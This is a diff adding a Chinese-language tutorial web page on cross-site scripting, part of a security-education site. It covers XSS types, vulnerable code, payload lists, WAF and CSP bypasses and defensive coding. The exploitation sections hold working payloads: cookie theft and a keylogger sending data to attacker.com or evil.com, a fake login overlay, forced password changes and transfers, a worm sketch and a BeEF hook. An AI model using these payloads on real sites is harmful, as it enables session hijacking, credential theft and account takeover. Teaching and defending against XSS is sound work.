@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS 跨站脚本攻击 - 经典漏洞专题</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>经典漏洞专题</h2>
+    <ul>
+      <li><a href="01_XSS攻击.html" class="active">XSS 跨站脚本</a></li>
+      <li><a href="02_CSRF攻击.html">CSRF 跨站请求伪造</a></li>
+      <li><a href="03_XXE注入.html">XXE 外部实体注入</a></li>
+      <li><a href="04_文件上传漏洞.html">文件上传与包含</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#overview">XSS概述</a></li>
+      <li><a href="#reflected">反射型XSS</a></li>
+      <li><a href="#stored">存储型XSS</a></li>
+      <li><a href="#dom">DOM型XSS</a></li>
+      <li><a href="#payloads">Payload大全</a></li>
+      <li><a href="#bypass">WAF绕过</a></li>
+      <li><a href="#exploitation">利用技术</a></li>
+      <li><a href="#csp">CSP防御</a></li>
+      <li><a href="#defense">防御代码</a></li>
+    </ul>
+    <h2>导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+      <li><a href="../03_OWASP_Top10_2021/A03_注入攻击.html">A03:注入攻击</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="01_XSS攻击.html">经典漏洞专题</a> / XSS 跨站脚本攻击
+    </div>
+
+    <h1>XSS 跨站脚本攻击完全指南</h1>
+    <p><span class="tag critical">HIGH</span> XSS (Cross-Site Scripting) 是最常见的 Web 漏洞之一。攻击者将恶意脚本注入到受信任的网页中，在其他用户的浏览器中执行。</p>
+
+    <div class="info-box note">
+      <div class="box-title">XSS 的本质</div>
+      <p>XSS 的本质是：<strong>攻击者的 JavaScript 代码在受害者的浏览器中，以目标网站的身份执行</strong>。由于同源策略，浏览器信任来自 example.com 的所有脚本 —— 包括被注入的恶意脚本。</p>
+    </div>
+
+    <!-- Section 1 -->
+    <h2 id="overview">1. XSS 概述</h2>
+
+    <h3>1.1 同源策略回顾</h3>
+    <p>理解 XSS 的前提是理解<strong>同源策略（Same-Origin Policy）</strong>：</p>
+    <ul>
+      <li>浏览器允许同源的脚本访问该源的所有资源（Cookie、DOM、AJAX）</li>
+      <li>XSS 让攻击者的代码<strong>以目标网站为源</strong>运行 → 可以做目标网站能做的一切</li>
+    </ul>
+
+    <h3>1.2 XSS 三大类型对比</h3>
+    <table>
+      <thead><tr><th>类型</th><th>触发方式</th><th>持久性</th><th>危害程度</th><th>典型场景</th></tr></thead>
+      <tbody>
+        <tr><td><strong>反射型</strong></td><td>URL中的参数被反射到页面</td><td>一次性(需诱导点击)</td><td>中</td><td>搜索框、错误消息</td></tr>
+        <tr><td><strong>存储型</strong></td><td>恶意数据存入数据库，展示时触发</td><td>永久(所有访问者受影响)</td><td>高</td><td>评论区、用户资料</td></tr>
+        <tr><td><strong>DOM型</strong></td><td>客户端JS处理不当导致</td><td>取决于场景</td><td>中-高</td><td>前端路由、动态渲染</td></tr>
+      </tbody>
+    </table>
+
+    <h3>1.3 XSS 能做什么？</h3>
+    <ul>
+      <li><strong>窃取 Cookie/Session</strong>：<code>document.cookie</code> → 会话劫持</li>
+      <li><strong>键盘记录</strong>：监听 <code>keypress</code> 事件 → 记录密码</li>
+      <li><strong>钓鱼</strong>：修改页面 DOM 显示假登录框</li>
+      <li><strong>加密货币挖矿</strong>：利用受害者 CPU</li>
+      <li><strong>蠕虫传播</strong>：自动发布包含 XSS 的内容（Samy 蠕虫）</li>
+      <li><strong>下载恶意软件</strong>：诱导或自动下载</li>
+      <li><strong>内网探测</strong>：利用受害者浏览器扫描内网</li>
+      <li><strong>获取摄像头/麦克风权限</strong>（需要用户授权弹窗）</li>
+    </ul>
+
+    <!-- Section 2 -->
+    <h2 id="reflected">2. 反射型 XSS</h2>
+
+    <p>用户输入从 URL 参数中被"反射"到响应页面中，如果未经编码直接输出，就会执行恶意脚本。</p>
+
+    <div class="diagram">反射型 XSS 攻击流程：
+
+1. 攻击者构造恶意URL:
+   http://example.com/search?q=&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
+
+2. 攻击者将URL通过钓鱼邮件/社交工程发送给受害者
+
+3. 受害者点击链接 → 浏览器发送请求到 example.com
+
+4. 服务器返回页面，包含:
+   &lt;p&gt;搜索结果: &lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;&lt;/p&gt;
+
+5. 受害者浏览器执行脚本 → Cookie 被发送到攻击者服务器
+
+6. 攻击者获得受害者的 session cookie → 登录受害者账户</div>
+
+    <h3>2.1 漏洞代码示例</h3>
+    <pre><code># Python Flask - 反射型XSS
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    # ❌ 直接将用户输入嵌入 HTML
+    return f'&lt;h1&gt;搜索结果: {query}&lt;/h1&gt;'
+
+# PHP
+&lt;?php
+// ❌ 直接输出
+echo "&lt;h1&gt;搜索: " . $_GET['q'] . "&lt;/h1&gt;";
+?&gt;
+
+# Node.js Express
+app.get('/search', (req, res) => {
+    // ❌ 直接拼接
+    res.send(`&lt;h1&gt;Results for: ${req.query.q}&lt;/h1&gt;`);
+});</code></pre>
+
+    <!-- Section 3 -->
+    <h2 id="stored">3. 存储型 XSS</h2>
+
+    <p>恶意脚本被永久存储在目标服务器（数据库）中。每个查看该内容的用户都会被攻击。<strong>危害最大</strong>。</p>
+
+    <div class="diagram">存储型 XSS 攻击流程：
+
+1. 攻击者在论坛发表评论:
+   "好文章！&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;"
+
+2. 恶意评论存入数据库
+
+3. 其他用户浏览该帖子
+
+4. 服务器从数据库读取评论，未编码直接输出到页面
+
+5. 每个查看帖子的用户 → 浏览器执行恶意脚本 → Cookie 被窃取
+
+影响范围：所有查看该页面的用户（可能数千人）</div>
+
+    <h3>3.1 常见存储型 XSS 注入点</h3>
+    <ul>
+      <li>用户昵称/签名/个人简介</li>
+      <li>论坛帖子/评论</li>
+      <li>私信/站内信</li>
+      <li>文件名（上传文件后展示文件名）</li>
+      <li>订单备注（客服后台查看时触发）</li>
+      <li>反馈表单（管理员查看时触发）</li>
+      <li>日志记录（安全人员查看日志时触发 → 针对管理员的攻击！）</li>
+    </ul>
+
+    <!-- Section 4 -->
+    <h2 id="dom">4. DOM 型 XSS</h2>
+
+    <p>漏洞完全在客户端 JavaScript 中。恶意数据不经过服务器，直接在浏览器 DOM 操作中被执行。</p>
+
+    <h3>4.1 DOM XSS 原理</h3>
+    <pre><code>// ❌ 漏洞代码 - 从URL获取数据直接写入DOM
+// URL: http://example.com/page#&lt;img src=x onerror=alert(1)&gt;
+
+// Source (数据来源) → Sink (危险函数)
+var hash = location.hash.substring(1);  // Source: location.hash
+document.getElementById('output').innerHTML = hash;  // Sink: innerHTML
+
+// 其他常见 Source:
+// - document.URL
+// - document.referrer
+// - location.href / location.hash / location.search
+// - window.name
+// - postMessage 的 event.data
+
+// 其他常见 Sink:
+// - innerHTML / outerHTML
+// - document.write()
+// - eval()
+// - setTimeout(string) / setInterval(string)
+// - jQuery .html() / .append() / $()
+// - element.setAttribute("onclick", userInput)</code></pre>
+
+    <h3>4.2 DOM XSS vs 反射型 XSS</h3>
+    <table>
+      <thead><tr><th>区别</th><th>反射型</th><th>DOM型</th></tr></thead>
+      <tbody>
+        <tr><td>恶意数据经过服务器？</td><td>是（服务器返回带payload的HTML）</td><td>否（纯客户端处理）</td></tr>
+        <tr><td>服务端能看到攻击？</td><td>能（在日志中）</td><td>不能（fragment#后内容不发送到服务器）</td></tr>
+        <tr><td>WAF能拦截？</td><td>通常能</td><td>不能（数据不经过服务器）</td></tr>
+        <tr><td>修复方式</td><td>服务端输出编码</td><td>前端JS安全编码</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 5 -->
+    <h2 id="payloads">5. XSS Payload 大全</h2>
+
+    <h3>5.1 基础 Payload</h3>
+    <pre><code>&lt;!-- 最经典 --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+&lt;!-- 事件处理器 --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+
+&lt;!-- 伪协议 --&gt;
+&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+
+&lt;!-- 编码绕过 --&gt;
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;  &lt;!-- HTML实体 --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;  &lt;!-- Unicode转义 --&gt;</code></pre>
+
+    <h3>5.2 上下文相关 Payload</h3>
+    <pre><code>&lt;!-- 1. HTML标签内文本 --&gt;
+输入点: &lt;div&gt;[用户输入]&lt;/div&gt;
+Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+         &lt;img src=x onerror=alert(1)&gt;
+
+&lt;!-- 2. HTML属性值(双引号) --&gt;
+输入点: &lt;input value="[用户输入]"&gt;
+Payload: " onfocus=alert(1) autofocus="
+         " &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input value="
+结果:    &lt;input value="" onfocus=alert(1) autofocus=""&gt;
+
+&lt;!-- 3. href/src属性 --&gt;
+输入点: &lt;a href="[用户输入]"&gt;
+Payload: javascript:alert(1)
+         data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- 4. JavaScript字符串内 --&gt;
+输入点: &lt;script&gt; var name = '[用户输入]'; &lt;/script&gt;
+Payload: '; alert(1); //
+         '+alert(1)+'
+         &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- 5. JavaScript模板字符串 --&gt;
+输入点: &lt;script&gt; var x = `Hello ${[用户输入]}`; &lt;/script&gt;
+Payload: ${alert(1)}
+
+&lt;!-- 6. CSS上下文 --&gt;
+输入点: &lt;div style="color: [用户输入]"&gt;
+Payload: red; background: url(javascript:alert(1))  [旧浏览器]
+         expression(alert(1))  [IE]
+
+&lt;!-- 7. 注释中 --&gt;
+输入点: &lt;!-- [用户输入] --&gt;
+Payload: --&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></pre>
+
+    <!-- Section 6 -->
+    <h2 id="bypass">6. WAF 绕过技术</h2>
+
+    <h3>6.1 标签/事件变形</h3>
+    <pre><code>&lt;!-- 大小写混合 --&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;IMG SRC=x OnErRoR=alert(1)&gt;
+
+&lt;!-- 使用不常见标签 --&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id="&lt;img onerror=alert(1) src=1"&gt;&lt;/textarea&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+&lt;!-- 无引号/反引号 --&gt;
+&lt;img src=x onerror=alert`1`&gt;
+
+&lt;!-- 利用编码 --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)&gt;
+
+&lt;!-- 利用换行/Tab打断关键字 --&gt;
+&lt;img src=x one
+rror=alert(1)&gt;
+&lt;scr	ipt&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- Null字节 --&gt;
+&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- 利用SVG命名空间 --&gt;
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></pre>
+
+    <h3>6.2 编码绕过</h3>
+    <table>
+      <thead><tr><th>编码方式</th><th>原始</th><th>编码后</th><th>解码上下文</th></tr></thead>
+      <tbody>
+        <tr><td>HTML实体(十进制)</td><td><code>alert</code></td><td><code>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;</code></td><td>HTML属性中</td></tr>
+        <tr><td>HTML实体(十六进制)</td><td><code>alert</code></td><td><code>&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;</code></td><td>HTML属性中</td></tr>
+        <tr><td>URL编码</td><td><code>&lt;script&gt;</code></td><td><code>%3Cscript%3E</code></td><td>URL参数/服务端解码</td></tr>
+        <tr><td>双重URL编码</td><td><code>&lt;</code></td><td><code>%253C</code></td><td>服务器解码两次</td></tr>
+        <tr><td>Unicode转义</td><td><code>alert</code></td><td><code>alert</code></td><td>JavaScript中</td></tr>
+        <tr><td>Base64</td><td><code>alert(1)</code></td><td><code>eval(atob('YWxlcnQoMSk='))</code></td><td>JS中解码执行</td></tr>
+      </tbody>
+    </table>
+
+    <h3>6.3 过滤绕过思路</h3>
+    <pre><code>// WAF 过滤了 "alert"
+prompt(1)
+confirm(1)
+console.log(1)
+window['al'+'ert'](1)
+top['al'+'ert'](1)
+self['\x61lert'](1)
+Reflect.apply(window.alert, window, [1])
+
+// WAF 过滤了圆括号
+alert`1`                  // 模板字符串语法
+onerror=alert;throw 1     // throw触发error handler
+setTimeout`alert\x28\x29` // 反引号+编码
+
+// WAF 过滤了 "script"
+&lt;img src=x onerror=alert(1)&gt;  // 不需要script标签
+&lt;svg onload=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;
+
+// WAF 过滤了 "on" (事件处理器)
+&lt;script&gt;alert(1)&lt;/script&gt;     // 直接用script
+&lt;a href=javascript:alert(1)&gt;  // 伪协议
+
+// WAF 过滤了 document.cookie
+document['cookie']
+window['document']['cookie']
+self['doc'+'ument']['coo'+'kie']</code></pre>
+
+    <!-- Section 7 -->
+    <h2 id="exploitation">7. XSS 利用技术</h2>
+
+    <h3>7.1 Cookie 窃取</h3>
+    <pre><code>// 最基础的Cookie窃取
+&lt;script&gt;
+new Image().src = "http://attacker.com/steal?c=" + document.cookie;
+&lt;/script&gt;
+
+// 使用 fetch
+&lt;script&gt;
+fetch("http://attacker.com/steal?c=" + document.cookie);
+&lt;/script&gt;
+
+// 如果有 HttpOnly（无法通过JS读Cookie），换思路：
+// → 直接在当前会话中执行操作（不需要偷Cookie）</code></pre>
+
+    <h3>7.2 键盘记录器</h3>
+    <pre><code>&lt;script&gt;
+var keys = '';
+document.addEventListener('keypress', function(e) {
+    keys += e.key;
+    if (keys.length > 20) {
+        new Image().src = "http://attacker.com/keys?k=" + encodeURIComponent(keys);
+        keys = '';
+    }
+});
+&lt;/script&gt;</code></pre>
+
+    <h3>7.3 钓鱼（页面篡改）</h3>
+    <pre><code>&lt;script&gt;
+// 覆盖整个页面为假登录框
+document.body.innerHTML = `
+    &lt;div style="text-align:center; padding-top:100px;"&gt;
+        &lt;h2&gt;会话已过期，请重新登录&lt;/h2&gt;
+        &lt;form action="http://attacker.com/phish" method="POST"&gt;
+            &lt;input name="username" placeholder="用户名"&gt;&lt;br&gt;&lt;br&gt;
+            &lt;input name="password" type="password" placeholder="密码"&gt;&lt;br&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;登录&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+`;
+&lt;/script&gt;</code></pre>
+
+    <h3>7.4 AJAX 请求（以受害者身份执行操作）</h3>
+    <pre><code>&lt;script&gt;
+// 利用受害者身份修改密码
+fetch('/api/change-password', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({new_password: 'hacked123'}),
+    credentials: 'include'  // 携带Cookie
+});
+
+// 利用受害者身份转账
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to: 'attacker_account', amount: 10000}),
+    credentials: 'include'
+});
+&lt;/script&gt;</code></pre>
+
+    <h3>7.5 XSS 蠕虫</h3>
+    <pre><code>// Samy 蠕虫原理（MySpace 2005，史上第一个 XSS 蠕虫）
+// 1. 查看 Samy 主页的用户会执行XSS
+// 2. XSS 代码让受害者：
+//    a. 自动添加 Samy 为好友
+//    b. 在受害者的主页上复制同样的 XSS 代码
+// 3. 受害者的好友查看受害者主页 → 重复上述过程
+// 20小时内感染了100万用户
+
+&lt;script&gt;
+// 简化的蠕虫逻辑
+var payload = encodeURIComponent(document.getElementById('worm').innerHTML);
+// 1. 自动发送包含蠕虫的消息给所有好友
+fetch('/api/send-message', {
+    method: 'POST',
+    body: JSON.stringify({
+        to: 'all_friends',
+        content: '看看这个有趣的东西！' + payload
+    }),
+    credentials: 'include'
+});
+&lt;/script&gt;</code></pre>
+
+    <h3>7.6 使用 BeEF 框架</h3>
+    <pre><code>&lt;!-- BeEF (Browser Exploitation Framework) --&gt;
+&lt;!-- 注入 BeEF hook 脚本 --&gt;
+&lt;script src="http://attacker.com:3000/hook.js"&gt;&lt;/script&gt;
+
+&lt;!-- 一旦 hook 上，攻击者可以通过 BeEF 控制面板：
+  - 获取浏览器信息/插件列表
+  - 社工弹窗（假的Flash更新/登录框）
+  - 网络扫描（利用浏览器扫内网）
+  - 获取地理位置
+  - 截屏（通过canvas）
+  - 利用浏览器漏洞进一步提权
+--&gt;</code></pre>
+
+    <!-- Section 8 -->
+    <h2 id="csp">8. CSP 防御与绕过</h2>
+
+    <h3>8.1 CSP 工作原理</h3>
+    <div class="diagram">Content-Security-Policy 如何阻止 XSS：
+
+没有 CSP:
+  &lt;script&gt;alert(1)&lt;/script&gt;  → 浏览器执行 ✓
+
+有 CSP: script-src 'self'
+  &lt;script&gt;alert(1)&lt;/script&gt;  → 内联脚本，不在白名单 → 浏览器拒绝执行 ✗
+  &lt;script src="/js/app.js"&gt;  → 同源脚本 → 执行 ✓
+  &lt;script src="http://evil.com/xss.js"&gt; → 非同源 → 拒绝 ✗
+
+CSP 本质：白名单机制，只允许特定来源的脚本执行</div>
+
+    <h3>8.2 CSP 绕过技术</h3>
+    <pre><code>// 绕过 script-src 'self':
+// 如果同源有可控的 JS 文件（如 JSONP 端点）
+&lt;script src="/api/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;
+
+// 绕过 script-src 'unsafe-eval':
+eval("alert(1)")
+setTimeout("alert(1)")
+new Function("alert(1)")()
+
+// 绕过 script-src 'nonce-xxx':
+// 找到页面上已有nonce的script标签，利用DOM操作
+// 或者找到 base 标签注入（如果 base-uri 没限制）
+&lt;base href="http://evil.com/"&gt;
+// 然后页面上 &lt;script src="/js/app.js"&gt; 会从 evil.com 加载！
+
+// 绕过 CSP 通过 DNS prefetch 外带数据
+&lt;link rel="dns-prefetch" href="//data.attacker.com"&gt;
+// 即使 connect-src 限制了，DNS请求通常不受CSP限制
+
+// 利用 CSP report-uri 收集信息
+// 注入导致 CSP 违规的内容，报告中包含页面信息</code></pre>
+
+    <!-- Section 9 -->
+    <h2 id="defense">9. XSS 防御（开发者指南）</h2>
+
+    <h3>9.1 核心防御：输出编码</h3>
+    <div class="info-box success">
+      <div class="box-title">首要原则：在正确的上下文使用正确的编码</div>
+      <p>不同的输出上下文需要不同的编码方式。一种编码不能解决所有场景。</p>
+    </div>
+
+    <table>
+      <thead><tr><th>输出上下文</th><th>编码方式</th><th>需要编码的字符</th></tr></thead>
+      <tbody>
+        <tr><td>HTML 标签内文本</td><td>HTML 实体编码</td><td><code>&amp; &lt; &gt; " '</code></td></tr>
+        <tr><td>HTML 属性值</td><td>HTML 属性编码</td><td>除字母数字外全部编码</td></tr>
+        <tr><td>JavaScript 字符串</td><td>JavaScript 编码</td><td><code>\xHH</code> 格式</td></tr>
+        <tr><td>URL 参数值</td><td>URL 编码</td><td><code>%HH</code> 格式</td></tr>
+        <tr><td>CSS 值</td><td>CSS 编码</td><td><code>\HHHHHH</code> 格式</td></tr>
+      </tbody>
+    </table>
+
+    <h3>9.2 各语言/框架防御</h3>
+    <pre><code># Python Flask - 使用 Jinja2 自动转义
+# ✅ Jinja2 默认开启自动转义
+{{ user_input }}  {# 自动HTML编码 #}
+
+# ❌ 危险：标记为safe会跳过转义
+{{ user_input | safe }}  {# 不要这样做！ #}
+
+# ✅ 手动编码
+from markupsafe import escape
+escaped = escape(user_input)
+
+# ──────────────────────────────────────────────
+
+// JavaScript / Node.js
+// ✅ 使用 textContent 而非 innerHTML
+element.textContent = userInput;  // 安全：作为文本处理
+
+// ❌ 危险
+element.innerHTML = userInput;  // 会解析HTML！
+
+// ✅ 使用 DOMPurify 清理 HTML（允许部分HTML时）
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);
+
+// ──────────────────────────────────────────────
+
+// React - 默认安全
+// ✅ JSX 默认转义
+return &lt;div&gt;{userInput}&lt;/div&gt;  // 自动编码
+
+// ❌ 危险：dangerouslySetInnerHTML
+return &lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;  // 不安全！
+
+// ──────────────────────────────────────────────
+
+// PHP
+// ✅ 使用 htmlspecialchars
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+// ❌ 直接输出
+echo $input;</code></pre>
+
+    <h3>9.3 防御清单</h3>
+    <table>
+      <thead><tr><th>层次</th><th>措施</th><th>效果</th></tr></thead>
+      <tbody>
+        <tr><td>输出层</td><td>上下文感知的输出编码</td><td>阻止XSS执行（最核心）</td></tr>
+        <tr><td>输入层</td><td>输入验证（白名单）</td><td>过滤明显恶意输入</td></tr>
+        <tr><td>HTTP层</td><td>Content-Security-Policy</td><td>即使注入成功也限制执行</td></tr>
+        <tr><td>Cookie层</td><td>HttpOnly 标志</td><td>XSS无法窃取Cookie</td></tr>
+        <tr><td>Cookie层</td><td>SameSite 标志</td><td>配合防CSRF</td></tr>
+        <tr><td>框架层</td><td>使用现代框架(React/Vue/Angular)</td><td>默认转义输出</td></tr>
+        <tr><td>富文本</td><td>使用白名单HTML清理器(DOMPurify)</td><td>只允许安全的HTML标签/属性</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box warning">
+      <div class="box-title">常见错误防御</div>
+      <ul>
+        <li><strong>黑名单过滤</strong>：过滤 <code>&lt;script&gt;</code> → 用 <code>&lt;img onerror&gt;</code> 绕过</li>
+        <li><strong>只做输入验证不做输出编码</strong>：数据可能从其他入口进入</li>
+        <li><strong>全局替换 &lt; 和 &gt;</strong>：在 JS 上下文中无效</li>
+        <li><strong>依赖 WAF</strong>：WAF 总能被绕过，应作为补充而非唯一防御</li>
+      </ul>
+    </div>
+
+    <div class="nav-footer">
+      <a href="../03_OWASP_Top10_2021/A03_注入攻击.html">&larr; A03: 注入攻击</a>
+      <a href="02_CSRF攻击.html">CSRF 攻击 &rarr;</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
